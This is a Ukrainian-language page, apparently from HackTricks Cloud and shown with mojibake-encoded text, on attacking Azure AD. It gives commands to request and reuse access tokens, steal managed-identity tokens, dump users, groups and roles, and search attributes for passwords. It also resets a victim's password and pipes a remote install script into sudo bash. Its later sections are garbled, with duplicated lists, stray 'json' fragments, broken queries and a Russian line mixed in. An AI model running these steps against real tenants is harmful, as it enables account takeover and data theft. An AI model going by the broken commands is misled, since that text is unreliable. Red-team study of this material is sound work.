# Az - AzureAD (AAD)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤**.

</details>

## –ë–∞–∑–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

Azure Active Directory (Azure AD) —Å–ª—É–∂–∏—Ç—å —Ö–º–∞—Ä–Ω–∏–º —Å–µ—Ä–≤—ñ—Å–æ–º Microsoft –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—é —Ç–∞ –¥–æ—Å—Ç—É–ø–æ–º. –í—ñ–Ω —î –∫–ª—é—á–æ–≤–∏–º –¥–ª—è —Ç–æ–≥–æ, —â–æ–± —Å–ø—ñ–≤—Ä–æ–±—ñ—Ç–Ω–∏–∫–∏ –º–æ–≥–ª–∏ —É–≤—ñ–π—Ç–∏ —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ —è–∫ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ, —Ç–∞–∫ —ñ –ø–æ–∑–∞ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—î—é, –æ—Ö–æ–ø–ª—é—é—á–∏ Microsoft 365, –ø–æ—Ä—Ç–∞–ª Azure —Ç–∞ –±–µ–∑–ª—ñ—á —ñ–Ω—à–∏—Ö SaaS-–¥–æ–¥–∞—Ç–∫—ñ–≤. –î–∏–∑–∞–π–Ω Azure AD —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ –Ω–∞–¥–∞–Ω–Ω—è –æ—Å–Ω–æ–≤–Ω–∏—Ö —Å–ª—É–∂–± —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –≤–∫–ª—é—á–∞—é—á–∏ **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é —Ç–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏**.

–ö–ª—é—á–æ–≤—ñ —Ñ—É–Ω–∫—Ü—ñ—ó Azure AD –≤–∫–ª—é—á–∞—é—Ç—å **–±–∞–≥–∞—Ç–æ—Ñ–∞–∫—Ç–æ—Ä–Ω—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é** —Ç–∞ **—É–º–æ–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø**, —Ä–∞–∑–æ–º –∑ –±–µ–∑—à–æ–≤–Ω–æ—é —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—î—é –∑ —ñ–Ω—à–∏–º–∏ —Å–ª—É–∂–±–∞–º–∏ –±–µ–∑–ø–µ–∫–∏ Microsoft. –¶—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑–Ω–∞—á–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—Ç—å –±–µ–∑–ø–µ–∫—É —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç–µ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—è–º –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ —Ç–∞ –∑–∞–±–µ–∑–ø–µ—á—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–≤–æ—ó—Ö –ø–æ–ª—ñ—Ç–∏–∫ –¥–æ—Å—Ç—É–ø—É. –Ø–∫ —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç–∞–ª—å–Ω–∏–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç —Ö–º–∞—Ä–Ω–∏—Ö –ø–æ—Å–ª—É–≥ Microsoft, Azure AD —î –∫–ª—é—á–æ–≤–∏–º –¥–ª—è —Ö–º–∞—Ä–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—è–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.

## –°—É—Ç–Ω–æ—Å—Ç—ñ

### –ü–µ—Ä–µ–ª—ñ–∫

–î–ª—è —Ü—å–æ–≥–æ –ø–µ—Ä–µ–ª—ñ–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**—ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç az cli**](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)**,** –º–æ–¥—É–ª—å **PowerShell** [**AzureAD**](https://www.powershellgallery.com/packages/AzureAD/) (–∞–±–æ [**AzureAD Preview**](https://www.powershellgallery.com/packages/AzureADPreview)) —Ç–∞ –º–æ–¥—É–ª—å [**Az PowerShell**](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps).

{% hint style="success" %}
–£ Linux –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ PowerShell Core:

```bash
sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-common

# Ubuntu 20.04
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb

# Update repos
sudo apt-get update
sudo add-apt-repository universe

# Install & start powershell
sudo apt-get install -y powershell
pwsh

# Az cli
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
{% endhint %}

#### **–†—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ –º–æ–¥—É–ª—è–º–∏**

* **AzureAD** - —Ü–µ –º–æ–¥—É–ª—å PowerShell –≤—ñ–¥ Microsoft –¥–ª—è **—É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è Azure AD. –í—ñ–Ω –Ω–µ –ø–æ–∫–∞–∑—É—î –≤—Å—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –æ–±'—î–∫—Ç—ñ–≤ Azure AD —ñ –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ä–µ—Å—É—Ä—Å–∏ Azure**.
* **Az PowerShell** - —Ü–µ –º–æ–¥—É–ª—å –¥–ª—è **—É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ä–µ—Å—É—Ä—Å–∞–º–∏ Azure** –∑ –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ PowerShell.

### **–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è**

{% tabs %}
{% tab title="az cli" %}
```bash
az login #This will open the browser
az login -u <username> -p <password> #Specify user and password
az login --identity #Use the current machine managed identity (metadata)
az login --identity -u /subscriptions/<subscriptionId>/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID #Login with user managed identity
# Login as service principal
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p VerySecret --tenant contoso.onmicrosoft.com #With password
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p ~/mycertfile.pem --tenant contoso.onmicrosoft.com #With cert

# Request access token (ARM)
az account get-access-token
# Request access token for different resource. Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
az account get-access-token --resource-type aad-graph

# If you want to configure some defaults
az configure

# Get user logged-in already
az ad signed-in-user show

# Help
az find "vm" # Find vm commands
az vm -h # Get subdomains
az ad user list --query-examples # Get examples
```
{% endtab %}

{% tab title="Azure AD" %}
{% code overflow="wrap" %}
```powershell
Connect-AzureAD #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds

# Using tokens
## AzureAD cannot request tokens, but can use AADGraph and MSGraph tokens to connect
Connect-AzureAD -AccountId test@corp.onmicrosoft.com -AadAccessToken $token
```
{% endcode %}
{% endtab %}

{% tab title="Az PowerShell" %}
```powershell
Connect-AzAccount #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@corp.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds

# Get Access Token
(Get-AzAccessToken).Token
# Request access token to other endpoints: AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, MSGraph, OperationalInsights, ResourceManager, Storage, Synapse
Get-AzAccessToken -ResourceTypeName MSGraph
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token

# Conenct with access token
Connect-AzAccount -AccountId test@corp.onmicrosoft.com -AccessToken $token
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
## The -AccessToken is from management.azure.com

# Connect with Service principal/enterprise app secret
$password = ConvertTo-SecureString 'KWEFNOIRFIPMWL.--DWPNVFI._EDWWEF_ADF~SODNFBWRBIF' -AsPlainText -Force
$creds = New-Object
System.Management.Automation.PSCredential('2923847f-fca2-a420-df10-a01928bec653', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d

#All the Azure AD cmdlets have the format *-AzAD*
Get-Command *azad*
#Cmdlets for other Azure resources have the format *Az*
Get-Command *az*
```
{% endtab %}

{% tab title="Raw PS" %}
{% code overflow="wrap" %}
```powershell
#Using management
$Token = 'eyJ0eXAi..'
# List subscriptions
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using graph
Invoke-WebRequest -Uri "https://graph.windows.net/myorganization/users?api-version=1.6" -Headers @{Authorization="Bearer {0}" -f $Token}
```
{% endcode %}
{% endtab %}

{% tab title="–°–∏—Ä–æ–≤–∞ –û–°" %}
{% code overflow="wrap" %}
```bash
# Request tokens to access endpoints
# ARM
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Vault
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
{% endcode %}
{% endtab %}
{% endtabs %}

–ö–æ–ª–∏ –≤–∏ **—É–≤—ñ–π—à–ª–∏** —á–µ—Ä–µ–∑ **CLI** –≤ Azure –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –±—É–¥—å-—è–∫–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏, –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ **Azure Application** –∑ **—Ç–µ–Ω–∞–Ω—Ç–æ–º**, —è–∫–∏–π –Ω–∞–ª–µ–∂–∏—Ç—å **Microsoft**. –¶—ñ –¥–æ–¥–∞—Ç–∫–∏, —Ç–∞–∫—ñ —è–∫ —Ç—ñ, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —É —Å–≤–æ—î–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ, **–º–∞—é—Ç—å —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞**. –í–∏ **–Ω–µ –∑–º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤—Å—ñ –∑ –Ω–∏—Ö** —É **—Å–ø–∏—Å–∫–∞—Ö –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤**, —è–∫—ñ –≤–∏ –±–∞—á–∏—Ç–µ –≤ –∫–æ–Ω—Å–æ–ª—ñ, **–∞–ª–µ –≤–æ–Ω–∏ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, **—Å–∫—Ä–∏–ø—Ç powershell**, —è–∫–∏–π **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –¥–æ–¥–∞—Ç–æ–∫ –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–æ–º –∫–ª—ñ—î–Ω—Ç–∞ **`1950a258-227b-4e31-a9cf-717495945fc2`**. –ù–∞–≤—ñ—Ç—å —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ –Ω–µ –∑'—è–≤–ª—è—î—Ç—å—Å—è –≤ –∫–æ–Ω—Å–æ–ª—ñ, —Å–∏—Å—Ç–µ–º–Ω–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ **–∑–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫**, —â–æ–± –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –Ω–µ –º–æ–≥–ª–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —è–∫—ñ –ø—ñ–¥–∫–ª—é—á–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫.

–û–¥–Ω–∞–∫ —î **—ñ–Ω—à—ñ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ –∫–ª—ñ—î–Ω—Ç—ñ–≤** –¥–æ–¥–∞—Ç–∫—ñ–≤, —è–∫—ñ **–¥–æ–∑–≤–æ–ª—è—Ç—å –≤–∞–º –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ Azure**:

```powershell
# The important part is the ClientId, which identifies the application to login inside Azure

$token = Invoke-Authorize -Credential $credential `
-ClientId '1dfb5f98-f363-4b0f-b63a-8d20ada1e62d' `
-Scope 'Files.Read.All openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "https://graphtryit-staging.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId '65611c08-af8c-46fc-ad20-1888eb1b70d9' `
-Scope 'openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "chrome-extension://imjekgehfljppdblckcmjggcoboemlah" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId 'd3ce4cf8-6810-442d-b42e-375e14710095' `
-Scope 'openid' `
-Redirect_Uri "https://graphexplorer.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue
```

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

```bash
# Enumerate users
az ad user list --output table
az ad user list --query "[].userPrincipalName"
# Get info of 1 user
az ad user show --id "test@corp.onmicrosoft.com"
# Search "admin" users
az ad user list --query "[].displayName" | findstr /i "admin"
az ad user list --query "[?contains(displayName,'admin')].displayName"
# Search attributes containing the word "password"
az ad user list | findstr /i "password" | findstr /v "null,"
# All users from AzureAD
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi==null]"
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All users synced from on-prem
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi!=null]"
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get groups where the user is a member
az ad user get-member-groups --id <email>
# Get roles assigned to the user
az role assignment list --include-groups --include-classic-administrators true --assignee <email>
```

#### Azure AD

**Enumeration**

1.  **Get Tenant ID**

    ```bash
    az account show --query tenantId
    ```
2.  **List Users**

    ```bash
    az ad user list
    ```
3.  **List Groups**

    ```bash
    az ad group list
    ```
4.  **List Service Principals**

    ```bash
    az ad sp list
    ```
5.  **List Applications**

    ```bash
    az ad app list
    ```
6.  **List Domains**

    ```bash
    az ad domain list
    ```
7.  **List Role Assignments**

    ```bash
    az role assignment list
    ```
8.  **List Role Definitions**

    ```bash
    az role definition list
    ```
9.  **List Policies**

    ```bash
    az ad sp list --query "[].{displayName:displayName, objectId:objectId}"
    ```
10. **Get User**

    ```bash
    az ad user show --id <user_id>
    ```
11. **Get Group**

    ```bash
    az ad group show --group <group_name>
    ```
12. **Get Service Principal**

    ```bash
    az ad sp show --id <service_principal_id>
    ```

json \`\`\`

13. **Get Application**

    ```bash
    az ad app show --id <app_id>
    ```
14. **Get Domain**

    ```bash
    az ad domain show --name <domain_name>
    ```
15. **Get Role Assignment**

    ```bash
    az role assignment list --assignee <assignee_id>
    ```
16. **Get Role Definition**

    ```bash
    az role definition list --name <role_name>
    ```
17. **Get Policy**

    ```bash
    az ad sp show --id <policy_id>
    ```

**Dumping**

1.  **Dump Users**

    ```bash
    az ad user list --query "[].{displayName:displayName, objectId:objectId}"
    ```
2.  **Dump Groups**

    ```bash
    az ad group list --query "[].{displayName:displayName, objectId:json"
    ```
3.  **Dump Service Principals**

    ```bash
    az ad sp list --query "[].{displayName:displayName, objectId:objectId}"
    ```

json

````

4. **Dump Applications**
```bash
az ad app list --query "[].{displayName:displayName, objectId:objectId}"
````

5.  **Dump Domains**

    ```bash
    az ad domain list --query "[].{displayName:displayName, objectId:objectId}"
    ```
6.  **Dump Role Assignments**

    ```bash
    az role assignment list --query "[].{displayName:displayName, objectId:json"
    ```
7.  **Dump Role Definitions**

    ```bash
    az role definition list --query "[].{displayName:displayName, objectId:objectId}"
    ```
8.  **Dump Policies**

    ```bash
    az ad sp list --query "[].{displayName:displayName, objectId:objectId}"
    ```

**Other**

1.  **Get Azure AD Sign-Ins**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/registrations
    ```
2.  **Get Azure AD B2C Sign-Ins**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/b2cUserFlows
    ```
3.  **Get Azure AD B2C Users**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/b2cUsers
    ```
4.  **Get Azure AD Applications**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/applications
    ```
5.  **Get Azure AD Service Principals**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/servicePrincipals
    ```
6.  **Get Azure AD Domains**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/domains
    ```
7.  **Get Azure AD Users**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/users
    ```
8.  **Get Azure AD Groups**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/groups
    ```
9.  **Get Azure AD Role Assignments**

    ```bash
    az monitor activity-log list --resource-type Microsoft.authorization/roleAssignments
    ```
10. **Get Azure AD Role Definitions**

    ```bash
    az monitor activity-log list --resource-type Microsoft.authorization/roleDefinitions
    ```
11. **Get Azure AD Policies**

    ```bash
    az monitor activity-log list --resource-type Microsoft.authorization/policies
    ```
12. **Get Azure AD Applications**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/applications
    ```
13. **Get Azure AD Service Principals**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/servicePrincipals
    ```
14. **Get Azure AD Domains**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/domains
    ```
15. **Get Azure AD Users**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/users
    ```
16. **Get Azure AD Groups**

    ```bash
    az monitor activity-log list --resource-type Microsoft.aadiam/groups
    ```
17. **Get Azure AD Role Assignments**

    ```bash
    az monitor activity-log list --resource-type Microsoft.authorization/roleAssignments
    ```
18. **Get Azure AD Role Definitions**

    ```bash
    az monitor activity-log list --resource-type Microsoft.authorization/roleDefinitions
    ```
19. **Get Azure AD Policies**

    ```bash
    az monitor activity-log list --resource-type Microsoft.authorization/policies
    ```

```powershell
# Enumerate Users
Get-AzureADUser -All $true
Get-AzureADUser -All $true | select UserPrincipalName
# Get info of 1 user
Get-AzureADUser -ObjectId test@corp.onmicrosoft.com | fl
# Search "admin" users
Get-AzureADUser -SearchString "admin" #Search admin at the begining of DisplayName or userPrincipalName
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"} #Search "admin" word in DisplayName
# Get all attributes of a user
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com|%{$_.PSObject.Properties.Name}
# Search attributes containing the word "password"
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
# All users from AzureAD# All users from AzureAD
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All users synced from on-prem
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Objects created by a/any user
Get-AzureADUser [-ObjectId <email>] | Get-AzureADUserCreatedObject
# Devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Objects owned by a specific user
Get-AzureADUserOwnedObject -ObjectId test@corp.onmicrosoft.com
# Get groups & roles where the user is a member
Get-AzureADUserMembership -ObjectId 'test@corp.onmicrosoft.com'
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get devices registered by a user
Get-AzureADUserRegisteredDevice -ObjectId test@defcorphq.onmicrosoft.com
# Apps where a user has a role (role not shown)
Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
# Get Administrative Units of a user
$userObj = Get-AzureADUser -Filter "UserPrincipalName eq 'bill@example.com'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where { $_.Id -eq $userObj.ObjectId } }
```

\{% –∫–æ–Ω–µ—Ü –≤–∫–ª–∞–¥–∫–∏ %\} \{% –∫–æ–Ω–µ—Ü –≤–∫–ª–∞–¥–∫–∏ %\}

```powershell
# Enumerate users
Get-AzADUser
# Get details of a user
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
# Search user by string
Get-AzADUser -SearchString "admin" #Search at the beginnig of DisplayName
Get-AzADUser | ?{$_.Displayname -match "admin"}
# Get roles assigned to a user
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
```

#### –ó–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞

{% code overflow="wrap" %}
```powershell
$password = "ThisIsTheNewPassword.!123" | ConvertTo- SecureString -AsPlainText ‚ÄìForce

(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "victim@corp.onmicrosoft.com"}).ObjectId | Set- AzureADUserPassword -Password $password ‚ÄìVerbose
```
{% endcode %}

### MFA & –£–º–æ–≤–Ω—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –¥–æ—Å—Ç—É–ø—É

–í–∏—Å–æ–∫–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –¥–æ–¥–∞—Ç–∏ MFA –¥–æ –∫–æ–∂–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –æ–¥–Ω–∞–∫ –¥–µ—è–∫—ñ –∫–æ–º–ø–∞–Ω—ñ—ó –º–æ–∂—É—Ç—å –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –π–æ–≥–æ –∞–±–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –∑ –£–º–æ–≤–Ω–∏–º –¥–æ—Å—Ç—É–ø–æ–º: –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –±—É–¥–µ **–ø–æ—Ç—Ä—ñ–±–Ω–æ MFA**, —è–∫—â–æ –≤—ñ–Ω —É–≤—ñ–π–¥–µ –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –º—ñ—Å—Ü—è, –±—Ä–∞—É–∑–µ—Ä–∞ –∞–±–æ **—è–∫–æ—ó—Å—å —É–º–æ–≤–∏**. –¶—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏, —è–∫—â–æ –Ω–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –º–æ–∂—É—Ç—å –±—É—Ç–∏ —Å—Ö–∏–ª—å–Ω—ñ –¥–æ **–æ–±—Ö—ñ–¥—É**. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

### –ì—Ä—É–ø–∏

```powershell
# Enumerate groups
az ad group list
az ad group list --query "[].[displayName]" -o table
# Get info of 1 group
az ad group show --group <group>
# Get "admin" groups
az ad group list --query "[].displayName" | findstr /i "admin"
az ad group list --query "[?contains(displayName,'admin')].displayName"
# All groups from AzureAD
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi==null]"
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All groups synced from on-prem
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi!=null]"
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get members of group
az ad group member list --group <group> --query "[].userPrincipalName" -o table
# Check if member of group
az ad group member check --group "VM Admins" --member-id <id>
# Get which groups a group is member of
az ad group get-member-groups -g "VM Admins"
# Get Apps where a group has a role (role not shown)
Get-AzureADGroup -ObjectId <id> | Get-AzureADGroupAppRoleAssignment | fl *
```

### Azure AD

#### Enumerate Azure AD

**Using Azure CLI**

```bash
az ad user list
az ad group list
az ad sp list
```

**Using Graph API**

```bash
GET https://graph.microsoft.com/v1.0/users
GET https://graph.microsoft.com/v1.0/groups
GET https://graph.microsoft.com/vjson/servicePrincipals
```

#### Dump Azure AD

**Using Azure CLI**

```bash
az rest --method get --uri https://graph.microsoft.com/v1.0/users
az rest --method get --uri https://graph.microsoft.com/v1.0/groups
